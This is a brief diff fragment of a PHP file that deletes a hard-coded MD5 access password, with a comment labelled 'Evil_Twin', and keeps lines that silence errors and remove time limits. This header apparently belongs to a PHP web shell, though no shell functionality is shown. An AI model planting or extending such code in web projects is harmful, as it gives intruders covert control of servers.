@@ -1,5 +1,4 @@
 <?php
-$auth_pass = '1ce078f22a61442f2477cf8a3270abb1'; // MD5 : Evil_Twin
 @error_reporting(0);
 @set_time_limit(0);
 	if(version_compare(PHP_VERSION, '5.3.0', '<')) {
